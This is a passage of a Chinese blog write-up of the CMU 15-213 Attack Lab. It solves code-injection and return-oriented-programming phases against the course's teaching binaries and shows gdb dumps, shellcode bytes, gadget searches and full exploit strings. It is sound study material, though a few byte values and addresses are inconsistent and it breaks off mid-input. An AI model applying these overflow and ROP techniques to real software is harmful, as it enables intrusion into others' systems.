\tnop\n</code></pre>\n<p>那么其字节应该是<code>bf 78 dc 61 55 48 83 ec 08 c7 04 24 fa 18 40 00 c3</code>。一共 17 个字节，加上最前面 8 个字节，一共 25 个字节。最后插入 15 个字节的<code>nop</code>。<br>执行过程中内存情况如下：</p>\n<pre><code>(gdb) x/48xb 0x5561dc78\n0x5561dc78:     0x35    0x39    0x62    0x39    0x39    0x37    0x66    0x61\n0x5561dc80:     0xbf    0x78    0xdc    0x61    0x55    0x48    0x83    0xec\n0x5561dc88:     0x08    0xc7    0x04    0x24    0xfa    0x18    0x40    0x00\n0x5561dc90:     0xc3    0x90    0x90    0x90    0x90    0x90    0x90    0x90\n0x5561dc98:     0x90    0x90    0x90    0x90    0x90    0x90    0x90    0x90\n0x5561dca0:     0x80    0xdc    0x61    0x55    0x00    0x00    0x00    0x00\n</code></pre>\n<p>而这里我们打印值后发现我们的<code>%edi</code>所指向的字符串如下：</p>\n<pre><code>(gdb) x/s $rdi\n0x5561dc78:     &quot;59b997fa\\277x\\334aUH\\203\\354\\b\\307\\004$\\372\\030@&quot;\n</code></pre>\n<p>而<code>cookie</code>的值如下：</p>\n<pre><code>(gdb) p /x cookie\n$14 = 0x59b997fa\n</code></pre>\n<p>但是后来这个<code>buf</code>的空间就变成了这样：</p>\n<pre><code>5: x/48xb 0x5561dc78\n0x5561dc78:     0x00    0x2e    0x40    0xcb    0xed    0x3e    0x25    0xb2\n0x5561dc80:     0x78    0xdc    0x61    0x55    0x00    0x00    0x00    0x00\n0x5561dc88:     0xe8    0x5f    0x68    0x55    0x00    0x00    0x00    0x00\n0x5561dc90:     0x02    0x00    0x00    0x00    0x00    0x00    0x00    0x00\n0x5561dc98:     0x16    0x19    0x40    0x00    0x00    0x00    0x00    0x00\n0x5561dca0:     0x00    0x60    0x58    0x55    0x00    0x00    0x00    0x00\n</code></pre>\n<p>但是我们后来发现，这里栈的内容被完全改变了，而且字符串的后面忘了加<code>\\0</code>字符。所以这里是有一些问题的。</p>\n<h4 id=\"正确的解答\"><a href=\"#正确的解答\" class=\"headerlink\" title=\"正确的解答\"></a>正确的解答</h4><p>经过查阅一些<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82MDcyNDk0OA==\">网上的资料</span>发现，我在阅读 C 语言代码的时候忽略了这 2 行：</p>\n<pre><code class=\"c\">char cbuf[110];\n/* Make position of check string unpredictable */\nchar *s = cbuf + random() % 100;\n</code></pre>\n<p>那么<code>hexmatch</code>和<code>strncmp</code>中分配的空间就是随机的。那么我们所做出的改变应该是让插入的字符串放在父函数<code>test</code>的位置，然后让<code>%rdi</code>指向<code>test</code>栈空间中的位置。<code>test</code>函数的位置在返回地址下面，那么应该是<code>buf + 48</code>即<code>0x5561dca8</code>。其字符<code>bf 78 dc 61 55 48 83 ec 00</code>应该在返回地址后面。而攻击代码也应该改为：</p>\n<pre><code>movl $0x5561dca8,%edi\nsubq $0x8,%rsp\nmovl $0x4018fa,(%rsp)\nret\n</code></pre>\n<p>中间两行代码可以改为<code>pushq $0x4018fa</code>。由此，我们在<code>ph3.s</code>中放入如下内容：</p>\n<pre><code>movl $0x5561dca8,%edi\npushq $0x4018fa\nret\n</code></pre>\n<p>后续步骤和前述一样，我们生成其汇编代码：</p>\n<pre><code>\nph3.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 &lt;.text&gt;:\n   0:\tbf a0 dc 61 55       \tmov    $0x5561dca8,%edi\n   5:\t68 fa 18 40 00       \tpushq  $0x4018fa\n   a:\tc3                   \tretq\n   b:\t90                   \tnop\n   c:\t90                   \tnop\n   d:\t90                   \tnop\n   e:\t90                   \tnop\n</code></pre>\n<p>这次我们不把汇编代码插入<code>buf + 8</code>了，因为没有意义，我们直接将其插入汇编代码开头即可。最后的 8 个字节返回地址改为<code>0x5561dc78</code>。其前面的内容为<code>bf a0 dc 61 55 68 fa 18 40 00 c3</code>，共 11 个字节。插入 29 个<code>nop</code>(0x90)。在插入 8 个字节的返回地址（<code>0x000000005561dc78</code>）。最后放入 9 个字节的字符串<code>0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61 0x00</code>。最后结果如下：</p>\n<pre><code class=\"bash\">Cookie: 0x59b997fa\nType string:Touch3!: You called touch3(&quot;59b997fa&quot;)\nValid solution for level 3 with target ctarget\nPASS: Would have posted the following:\n        user id bovik\n        course  15213-f15\n        lab     attacklab\n        result  1:PASS:0xffffffff:ctarget:3:BF A8 DC 61 55 68 FA 18 40 00 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00\n</code></pre>\n<p>通过！</p>\n<h2 id=\"Part-II-Return-oriented-Programming-attack\"><a href=\"#Part-II-Return-oriented-Programming-attack\" class=\"headerlink\" title=\"Part II: Return oriented Programming attack\"></a>Part II: Return oriented Programming attack</h2><p><code>rtarget</code>的攻击要比<code>ctarget</code>难一些，因为：</p>\n<ol>\n<li>开启了栈随机化，程序的地址难以预测</li>\n<li>开启了 Non-executable 位，导致我们插入的代码部分难以执行</li>\n</ol>\n<p>因此，我们使用一种新的方法：return oriented programming attacks。它的核心在于利用已有的程序，而不是注入代码。每个 gadget 是一个代码段，每个 gadget 的最后都是<code>ret</code>指令（编码<code>c3</code>），将这个自己和其前面的部分字节组合起来，可以合成我们想要的指令。此外，针对 x86_64，我们不一定要利用整条指令，有的时候一条指令的一部分字节又可以组成另一条指令。所有 gadget 的地址被压在栈上，每次调用<code>ret</code>之后就会返回到下一个 gadget 的地址。</p>\n<h3 id=\"Phase-4\"><a href=\"#Phase-4\" class=\"headerlink\" title=\"Phase 4\"></a>Phase 4</h3><p>利用<code>rop</code>重做 Phase 2 的实验，可以使用<code>movq, popq, ret, nop</code>指令以及前 8 个寄存器(<code>%rax–%rdi</code>)<br>提示：</p>\n<ol>\n<li>可以在<code>start_farm</code>和<code>mid_farm</code>之间寻找 gadget</li>\n<li>可以只使用 2 个 gadget</li>\n<li>当一个 gadget 使用<code>popq</code>指令时，它从栈上弹出一个数值，所以你的攻击字符串可以是 gadget 地址和数值的组合。</li>\n</ol>\n<p>Phase 2 的目的是让<code>test()</code>跳转到<code>touch2</code>函数，并且需要让<code>%edi</code>的值等于<code>cookie</code>的值。</p>\n<p>我们当时做题的主要过程是：</p>\n<ol>\n<li>让最后的转移地址为<code>buf</code>开头的位置(<code>0x5561dc78</code>)</li>\n<li>在<code>buf</code>中存储攻击指令<ol>\n<li>让<code>%edi = *0x6054e4</code></li>\n<li>将<code>touch2</code>的地址压入栈中，<code>pushq 0x4017ec</code></li>\n</ol>\n</li>\n<li>调用<code>ret</code>返回</li>\n</ol>\n<p>我们在 phase 2 中需要插入的代码是：</p>\n<pre><code>    movq $0x6054e4,%rax\n    movq (%rax),%rdi\n    subq $0x8,%rsp\n    movq $0x4017ec,(%rsp)\n    ret\n</code></pre>\n<p>这里的变化在于，我们不需要使用<code>buf</code>来存储攻击指令了，而是在整个程序中寻找攻击指令。把第一个 gadget 的地址放在返回地址处，把第二个 gadget 的地址放在第一个 gadget 后面。以此类推。我们的目的是找到所有的 gadget。</p>\n<p>但是其实这段代码可以通过把<code>0x6054e4</code>和<code>0x6017ec</code>两个值压在栈上。首先利用一个<code>popq</code>指令将其弹出到<code>%rax</code>中，然后将<code>%rax</code>处的值移动到<code>%rdi</code>上。我们可以这样设计栈帧：</p>\n<p><img data-src=\"/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/frame.png\" alt=\"frame.png\"></p>\n<p>第一个<code>gadget</code>中的代码是：</p>\n<pre><code>movq %rsp, %rxx\npopq %rax\nmovq (%rax),%rdi\n</code></pre>\n<p>第二个<code>gadget</code>中的代码是：</p>\n<pre><code>popq %rax\nmovq %rax,(%rxx)\n</code></pre>\n<p>使用<code>popq %rax</code>是因为，<code>popq</code>有 8 种可能的结果，而只有<code>popq %rax</code>出现在代码的字节中，因此我们从这里出发。我们翻译一下<code>movq (%rax),%rdi</code>，其字节编码为<code>48 8b 38</code>。</p>\n<p>但是我们发现其实不用那么麻烦，也就是说不用保存之前的<code>%rsp</code>，这是因为我们可以通过<code>gadget</code>中的<code>ret</code>指令弹出后 8 个字节的地址并且首先跳转，那么就无需把<code>touch3</code>的地址保存在最开始的部分。栈空间可以简化成如下情况：</p>\n<p><img data-src=\"/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/frame1.png\" alt=\"frame1.png\"></p>\n<p>但是我们发现一个问题，就是<code>movq (%rax),%rdi</code>这条指令所对应的字节在源程序中找不到，因此我们需要采取一个更加优化的办法，就是不在栈上保存<code>cookie</code>的地址，而是直接保存<code>cookie</code>的值，<code>cookie</code>的值为<code>0x59b997fa</code>，那么栈空间可以简化成如下情况：</p>\n<p><img data-src=\"/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/frame3.png\" alt=\"frame3.png\"></p>\n<p>这样只需要两条指令就可以做到了。这两条指令的编码是</p>\n<pre><code>\ngadget.o:     file format elf64-x86-64\n\n\nDisassembly of section .text:\n\n0000000000000000 &lt;.text&gt;:\n   0:\t58                   \tpop    %rax\n   1:\t48 89 c7             \tmov    %rax,%rdi\n</code></pre>\n<p>但是这两条指令我们无法在同一处找到，因此需要划分为 2 个<code>gadget</code>。且两条后面的都必须接数个<code>90</code>（<code>nop</code>）加上一个<code>c3</code>。</p>\n<p>第一个的地址是<code>4019ab</code>或<code>4019cc</code>。第二个的地址是<code>4019a2</code>或者<code>4019c5</code>。</p>\n<p>我们这里使用<code>4019ab</code>和<code>4019a2</code>两个<code>gadget</code>。第一个中存储<code>pop %rax</code>指令，第二个中存储<code>mov %rax, %rdi</code>指令。最后的栈空间如下：</p>\n<p><img data-src=\"/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/frame-last.png\" alt=\"frame-last.png\"></p>\n<p>由此，输入的攻击字符串的前 40 个字节随意，后面 32 个字节根据上述栈情况为（注意应该用小端法）</p>\n<pre><code>ab 19 40 00 00 00 00 00\nfa 97 b9 59 00 00 00 00\na2 19 40 00 00 00 00 00\nec 17 40 00 00 00 00 00\n</code></pre>\n<blockquote>\n<p>刚刚差点把 gadget1 和 2 的地址搞反了，导致跑出来 segmentation fault，还疑惑是怎么回事，后来一看发现不好，哈哈哈哈，做题的时候还是要认真仔细嗷！</p>\n</blockquote>\n<p>输入<code>./hex2raw &lt; phase4.txt | ./rtarget -q</code>（注意不要输入成<code>ctarget</code>啦！），运行结果如下：</p>\n<pre><code class=\"bash\">gwen@gwen-virtual-machine:~/Documents/report/code/15213/lab/lab3-attack-lab$ ./hex2raw &lt; phase4.txt | ./rtarget -q\nCookie: 0x59b997fa\nType string:Touch2!: You called touch2(0x59b997fa)\nValid solution for level 2 with target rtarget\nPASS: Would have posted the following:\n        user id bovik\n        course  15213-f15\n        lab     attacklab\n        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00\n</code></pre>\n<h3 id=\"Phase-5\"><a href=\"#Phase-5\" class=\"headerlink\" title=\"Phase 5\"></a>Phase 5</h3><p>phase 5 的任务是让<code>%rdi</code>指向<code>cookie</code>的字符串表示并调用<code>touch 3</code>，这个任务看起来有点类似我们在 Phase 3 中做的工作。</p>\n<p>作者提示：</p>\n<ol>\n<li>可使用的<code>gadget</code>的范围是<code>start_farm</code>到<code>end_farm</code></li>\n<li>利用 Appendix 中的表</li>\n<li>复习一下课本 P83 的<code>movl</code>的用法</li>\n<li>官方答案使用了 8 个 gadget</li>\n</ol>\n<p>在 Phase 3 中我们所做的工作是：</p>\n<ol>\n<li>插入攻击字符串在攻击代码前</li>\n<li>在返回地址处插入攻击代码的起始位置</li>\n<li>在攻击代码中实现如下操作：<ol>\n<li>将攻击字符串的地址赋值给<code>%rdi</code></li>\n<li>将<code>touch3</code>的返回地址压入返回地址处</li>\n</ol>\n</li>\n</ol>\n<p>现在使用<code>rop</code>后的问题在于：攻击字符串压到哪？现在栈上是返回地址和字符串的组合。那么我们的想法是让攻击字符串放在所有 gadget 地址之后。但是具体放在之后多少呢？这要看<code>mov xxx, %rdi</code>中哪些地址的编码存在。</p>\n<p>首先，<code>cookie</code>的值是<code>59b997fa</code>，那么其字符串编码是<code>0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61 0x00</code>(<code>0x00</code>是字符串最后的<code>\\0</code>)。那么我们构建的<code>gadget</code>中应有的步骤是：</p>\n<ol>\n<li><code>mov 地址,%rdi</code></li>\n<li><code>ret</code></li>\n</ol>\n<p>此外，<code>touch3</code>的地址是<code>0x4018fa</code>。那么我们最初设计的栈空间如图：</p>\n<p><img data-src=\"/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/phase5.png\" alt=\"phase5.png\"></p>\n<p>但是我后来有点卡壳了，问题在于把字符串存在什么位置呢？如果存在那个位置，在<code>rtarget</code>汇编中能找到对应的<code>gadget</code>吗？于是我查找了<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC80MTA0MTgwNTM=\">一点资料</span>(有点耍赖了对不起对不起~)，这个资料中提到的一条信息是我没有想到的：</p>\n<blockquote>\n<p>rtarget 相比 ctarget 的区别在于开启了栈随机化。也就是运行时字符串的地址是不确定的。在 phase 3 中我们所做的工作是刚好将其压在<code>test</code>函数的返回地址下面，但是这里我们需要其相对与栈顶的地址。</p>\n</blockquote>\n<p>因此，我们应该做的步骤是：</p>\n<pre><code>1. 将攻击字符串放在%rsp + offset 处\n2. 让 %rdi = %rsp + offset\n3. ret\n</code></pre>\n<p>那么如何计算这个地址，并且将其赋给<code>%rdi</code>呢？这个地址的计算需要在<code>%rsp</code>的基础上偏移几十个字节。地址的计算我们可以使用<code>lea</code>指令，然而加法运算如何实现呢？我们看看代码中有没有提供：</p>\n<pre><code class=\"c\">/* Add two arguments */\nlong add_xy(long x, long y)\n&#123;\n    return x+y;\n&#125;\n</code></pre>\n<p>这段代码的汇编格式如下：</p>\n<pre><code>00000000004019d6 &lt;add_xy&gt;:\n  4019d6:\t48 8d 04 37          \tlea    (%rdi,%rsi,1),%rax\n  4019da:\tc3                   \tretq\n</code></pre>\n<p>其把<code>%rdi</code>和<code>%rsi</code>累加到<code>%rax</code>中，那么我们要计算偏移量，需要分别把<code>%rsp</code>和偏移量放到<code>%rsi</code>和<code>%rdi</code>中。最后让<code>%rdi = rax</code>。</p>\n<p>在<code>rtarget</code>中，与<code>%rsp</code>相关的字节有<code>48 89 e0</code>，其编码为<code>movq %rsp,%rax</code>。和<code>%esp</code>相关的字节有<code>89 e0</code>，其编码为<code>movl %esp, %eax</code>。包含这段编码的代码如下：</p>\n<pre><code>0000000000401a03 &lt;addval_190&gt;:\n  401a03:\t8d 87 41 48 89 e0    \tlea    -0x1f76b7bf(%rdi),%eax\n  401a09:\tc3                   \tretq\n\n0000000000401a18 &lt;getval_345&gt;: // 不可取，c1不是单独指令\n  401a18:\tb8 48 89 e0 c1       \tmov    $0xc1e08948,%eax\n  401a1d:\tc3                   \tretq\n\n0000000000401a39 &lt;addval_110&gt;:\n  401a39:\t8d 87 c8 89 e0 c3    \tlea    -0x3c1f7638(%rdi),%eax\n  401a3f:\tc3                   \tretq\n\n0000000000401a47 &lt;addval_201&gt;: // 不可取，c7不是单独指令\n  401a47:\t8d 87 48 89 e0 c7    \tlea    -0x381f76b8(%rdi),%eax\n  401a4d:\tc3                   \tretq\n\n0000000000401a5a &lt;setval_299&gt;: // 不可取，91不是单独指令\n  401a5a:\tc7 07 48 89 e0 91    \tmovl   $0x91e08948,(%rdi)\n  401a60:\tc3                   \tretq\n\n0000000000401a83 &lt;addval_358&gt;:\n  401a83:\t8d 87 08 89 e0 90    \tlea    -0x6f1f76f8(%rdi),%eax\n  401a89:\tc3                   \tretq\n\n0000000000401a97 &lt;setval_181&gt;: // 不可取，c2不是单独指令\n  401a97:\tc7 07 48 89 e0 c2    \tmovl   $0xc2e08948,(%rdi)\n  401a9d:\tc3                   \tretq\n\n0000000000401aab &lt;setval_350&gt;:\n  401aab:\tc7 07 48 89 e0 90    \tmovl   $0x90e08948,(%rdi)\n  401ab1:\tc3                   \tretq\n</code></pre>\n<p>那么之前的过程就变为：</p>\n<pre><code>1. rax = rsp(48 89 e0)\n2. rsi = 偏移量\n3. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n4. rax = rdi + rsi（lea指令）\n5. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n6. ret\n7. 将攻击字符串放在%rsp + offset 处\n</code></pre>\n<p>我们找一下以<code>%rsi</code>和<code>%rdi</code>为目的寄存器的指令。</p>\n<p>以<code>%rdi</code>为目的寄存器的指令编码有<code>(48)* 89 (c|d|e|f)(7|f)</code>，在<code>rtarget</code>中可能的代码段如下：</p>\n<pre><code>00000000004019a0 &lt;addval_273&gt;: // 不可取，c3不是指令\n  4019a0:\t8d 87 48 89 c7 c3    \tlea    -0x3c3876b8(%rdi),%eax\n  4019a6:\tc3                   \tretq\n\n00000000004019ae &lt;setval_237&gt;: // 不可取，c7不是指令\n  4019ae:\tc7 07 48 89 c7 c7    \tmovl   $0xc7c78948,(%rdi)\n  4019b4:\tc3                   \tretq\n\n00000000004019c3 &lt;setval_426&gt;: // 是他！是他！就是他！\n  4019c3:\tc7 07 48 89 c7 90    \tmovl   $0x90c78948,(%rdi)\n  4019c9:\tc3                   \tretq\n</code></pre>\n<p>以<code>%rsi/%esi</code>为目的寄存器的指令编码有<code>(48)* 89 (c|d|e|f)(6|e)</code>。在<code>rtarget</code>中可能的代码段如下：</p>\n<pre><code>00000000004019e8 &lt;addval_113&gt;: // 不可取，78 c9不是指令\n  4019e8:\t8d 87 89 ce 78 c9    \tlea    -0x36873177(%rdi),%eax\n  4019ee:\tc3                   \tretq\n\n0000000000401a11 &lt;addval_436&gt;: // 可以是他！\n  401a11:\t8d 87 89 ce 90 90    \tlea    -0x6f6f3177(%rdi),%eax\n  401a17:\tc3                   \tretq\n\n0000000000401a25 &lt;addval_187&gt;: // 可以是他，38 c0 是cmpb %al指令，不影响结果\n  401a25:\t8d 87 89 ce 38 c0    \tlea    -0x3fc73177(%rdi),%eax\n  401a2b:\tc3                   \tretq\n\n0000000000401a61 &lt;addval_404&gt;: // 不可取，92 c3不是指令\n  401a61:\t8d 87 89 ce 92 c3    \tlea    -0x3c6d3177(%rdi),%eax\n  401a67:\tc3                   \tretq\n</code></pre>\n<p>这里没有<code>48</code>，那么就只能输送到<code>%esi</code>中。这里的难点在于如何把偏移量输送到<code>%esi</code>中？这里肯定是不能直接输送了，必须通过寄存器的中转。这里只出现了<code>89 ce</code>，通过查表我们可以发现<code>89 ce</code>对应的指令是<code>movl %ecx, %esi</code>。那么我们还需要想办法把值送到<code>%ecx</code>中。那么前面的过程就变成了：</p>\n<pre><code>1. rax = rsp(48 89 e0)\n2. ecx = 偏移量； rsi = ecx(89 ce)\n3. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n4. rax = rdi + rsi（lea指令）\n5. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n6. ret\n7. 将攻击字符串放在%rsp + offset 处\n</code></pre>\n<p>我们再来探测一下目的寄存器为<code>%ecx</code>的相关指令，其格式为<code>(48)* 89 (c|d|e|f)(1|9)</code>，包含其格式的代码段为：</p>\n<pre><code>00000000004019f6 &lt;getval_226&gt;: // 不可取，48 c0不是指令\n  4019f6:\tb8 89 d1 48 c0       \tmov    $0xc048d189,%eax\n  4019fb:\tc3                   \tretq\n0000000000401a33 &lt;getval_159&gt;: // 可取，38 c9 是cmpb %cl指令\n  401a33:\tb8 89 d1 38 c9       \tmov    $0xc938d189,%eax\n  401a38:\tc3                   \tretq\n0000000000401a68 &lt;getval_311&gt;: // 可取，08 db 是orb %bl指令\n  401a68:\tb8 89 d1 08 db       \tmov    $0xdb08d189,%eax\n  401a6d:\tc3                   \tretq\n0000000000401a6e &lt;setval_167&gt;: // 不可取，91 c3 不是指令\n  401a6e:\tc7 07 89 d1 91 c3    \tmovl   $0xc391d189,(%rdi)\n  401a74:\tc3                   \tretq\n</code></pre>\n<p>代码段中以<code>%ecx</code>为目的寄存器的代码格式为<code>89 d1</code>，其转化为指令为<code>movl %edx, %ecx</code>。</p>\n<p>那么前面的过程就变成了：</p>\n<pre><code>1. rax = rsp(48 89 e0)\n2. edx = 偏移量； ecx = edx；(89 d1) rsi = ecx(89 ce)\n3. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n4. rax = rdi + rsi（lea指令）\n5. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n6. ret\n7. 将攻击字符串放在%rsp + offset 处\n</code></pre>\n<p>我们再来探测一下目的寄存器为<code>%edx</code>的相关指令，其格式为<code>(48)* 89 (c|d|e|f)(2|a)</code>，包含其格式的代码段为：</p>\n<pre><code>00000000004019db &lt;getval_481&gt;: // 可以是他！\n  4019db:\tb8 5c 89 c2 90       \tmov    $0x90c2895c,%eax\n  4019e0:\tc3                   \tretq\n0000000000401a1e &lt;addval_479&gt;: // 不可以是他！\n  401a1e:\t8d 87 89 c2 00 c9    \tlea    -0x36ff3d77(%rdi),%eax\n  401a24:\tc3                   \tretq\n0000000000401a40 &lt;addval_487&gt;: // 可以是他，84 c0是 testb %al\n  401a40:\t8d 87 89 c2 84 c0    \tlea    -0x3f7b3d77(%rdi),%eax\n  401a46:\tc3                   \tretq\n0000000000401a54 &lt;getval_155&gt;: // 不可以是他，c4 c9不是指令\n  401a54:\tb8 89 c2 c4 c9       \tmov    $0xc9c4c289,%eax\n  401a59:\tc3                   \tretq\n0000000000401a8a &lt;addval_124&gt;: // 不可以是他，c7 37不是指令\n  401a8a:\t8d 87 89 c2 c7 3c    \tlea    0x3cc7c289(%rdi),%eax\n  401a90:\tc3                   \tretq\n0000000000401a9e &lt;addval_184&gt;: // 不可以是他，60 d2不是指令\n  401a9e:\t8d 87 89 c2 60 d2    \tlea    -0x2d9f3d77(%rdi),%eax\n  401aa4:\tc3                   \tretq\n</code></pre>\n<p>代码段中以<code>%edx</code>为目的寄存器的代码格式为<code>89 c2</code>，其转化为指令为<code>movl %eax, %edx</code>。</p>\n<p>那么前面的过程就变成了：</p>\n<pre><code>1. rax = rsp(48 89 e0)\n2. eax = 偏移量；edx = eax；(89 c2) ecx = edx；(89 d1) rsi = ecx(89 ce)\n3. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n4. rax = rdi + rsi（lea指令）\n5. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n6. ret\n7. 将攻击字符串放在%rsp + offset 处\n</code></pre>\n<p>以<code>%eax</code>(或<code>%rax</code>)为目的寄存器的指令格式为<code>(48)* 89 (c|d|e|f)(0|8)</code>，包含其格式的代码段为：</p>\n<pre><code>0000000000401a03 &lt;addval_190&gt;:\n  401a03:\t8d 87 41 48 89 e0    \tlea    -0x1f76b7bf(%rdi),%eax\n  401a09:\tc3                   \tretq\n0000000000401a18 &lt;getval_345&gt;:\n  401a18:\tb8 48 89 e0 c1       \tmov    $0xc1e08948,%eax\n  401a1d:\tc3                   \tretq\n0000000000401a39 &lt;addval_110&gt;:\n  401a39:\t8d 87 c8 89 e0 c3    \tlea    -0x3c1f7638(%rdi),%eax\n  401a3f:\tc3                   \tretq\n0000000000401a47 &lt;addval_201&gt;:\n  401a47:\t8d 87 48 89 e0 c7    \tlea    -0x381f76b8(%rdi),%eax\n  401a4d:\tc3                   \tretq\n0000000000401a5a &lt;setval_299&gt;:\n  401a5a:\tc7 07 48 89 e0 91    \tmovl   $0x91e08948,(%rdi)\n  401a60:\tc3                   \tretq\n0000000000401a83 &lt;addval_358&gt;:\n  401a83:\t8d 87 08 89 e0 90    \tlea    -0x6f1f76f8(%rdi),%eax\n  401a89:\tc3                   \tretq\n0000000000401a97 &lt;setval_181&gt;:\n  401a97:\tc7 07 48 89 e0 c2    \tmovl   $0xc2e08948,(%rdi)\n  401a9d:\tc3                   \tretq\n0000000000401aab &lt;setval_350&gt;:\n  401aab:\tc7 07 48 89 e0 90    \tmovl   $0x90e08948,(%rdi)\n  401ab1:\tc3                   \tretq\n</code></pre>\n<p>其中以<code>%eax</code>为目的寄存器的代码格式为<code>89 e0</code>，其主要目的为<code>movl %esp,%eax</code>，也就是我们步骤第一步中的内容。</p>\n<p>除此以外，还有一种涉及<code>%rax</code>的指令就是<code>popq %rax</code>，其指令编码为<code>58</code>。其在代码中出现的部分包含：</p>\n<pre><code>00000000004019a7 &lt;addval_219&gt;: // 可以是他！\n  4019a7:\t8d 87 51 73 58 90    \tlea    -0x6fa78caf(%rdi),%eax\n  4019ad:\tc3                   \tretq\n00000000004019b5 &lt;setval_424&gt;: // 92不是指令，不可以是他！\n  4019b5:\tc7 07 54 c2 58 92    \tmovl   $0x9258c254,(%rdi)\n  4019bb:\tc3                   \tretq\n00000000004019ca &lt;getval_280&gt;: // c3不是指令，不可以是他！\n  4019ca:\tb8 29 58 90 c3       \tmov    $0xc3905829,%eax\n  4019cf:\tc3                   \tretq\n</code></pre>\n<p>那么我们可以采取的方式是：</p>\n<pre><code>1. rax = rsp(48 89 e0)\n2. 偏移量存储在栈上；popq %eax；edx = eax；(89 c2) ecx = edx；(89 d1) rsi = ecx(89 ce)\n3. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n4. rax = rdi + rsi（lea指令）\n5. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n6. ret\n7. 将攻击字符串放在%rsp + offset 处\n</code></pre>\n<p>但是现在问题来了，<code>%rax</code>既要存储偏移量，又要存储<code>%rsp</code>，我们能否换个地方存储<code>%rsp</code>呢，其实可以把第 2 步和第 3 步换一下，让<code>%rax</code>转储到<code>%rdi</code>里去就行。最终步骤如下：</p>\n<pre><code>1. rax = rsp(48 89 e0)\n2. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n3. 偏移量存储在栈上；popq %eax；edx = eax；(89 c2) ecx = edx；(89 d1) rsi = ecx(89 ce)\n4. rax = rdi + rsi（lea指令）\n5. rdi = rax(&lt;setval_210&gt; 中的 48 89 c7)\n6. ret\n7. 将攻击字符串放在%rsp + offset 处\n</code></pre>\n<p>其中<code>gadget</code>的地址为：(单独的 gadget 地址见前文)</p>\n<ol>\n<li><code>rax = rsp</code> -&gt; <code>401a06</code></li>\n<li><code>rdi = rax</code> -&gt; <code>4019c5</code></li>\n<li><code>popq %eax</code> -&gt; <code>4019ab</code></li>\n<li>偏移量存储在栈上</li>\n<li><code>edx = eax</code> -&gt; <code>4019dd</code></li>\n<li><code>ecx = edx</code> -&gt; <code>401a69</code></li>\n<li><code>rsi = ecx</code> -&gt; <code>401a13</code></li>\n<li><code>rax = rdi + rsi</code> -&gt; <code>4019d6</code></li>\n<li><code>rdi = rax</code> -&gt; <code>4019c5</code></li>\n<li><code>touch3</code>地址 -&gt; <code>4018fa</code></li>\n</ol>\n<p>因为在执行第一条<code>rax = rsp</code>时，已经执行了一次<code>ret</code>指令，因此此时<code>%rsp</code>在<code>buf + 48</code>处，也就是返回地址已经被弹出了一个。所以在<code>buf + 48</code>后面是 9 个地址 + 数据，因此偏移量应该是 <code>9 * 8 = 72</code>，转化为 16 进制就是<code>0x48</code>。最终的栈结构如下：</p>\n<p><img data-src=\"/blog/2024/02/29/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E7%B3%BB%E7%BB%9F/%E7%B3%BB%E7%BB%9F%E5%85%A5%E9%97%A8/15-213/15-213%20Lab/Attack%20lab%20%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93/phase5-last.png\" alt=\"phase5-last.png\"></p>\n<p>因此，phase 5 的输入为：</p>\n<pre><code>00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n00 00 00 00 00 00 00 00\n06 1a 40 00 00 00 00 00\nc5 19 40 00 00 00 00 00\nab 19 40 00 00 00 00 00\n48 00 00 00 00 00 00 00\ndd 19 40 00 00 00 00 00\n69 1a 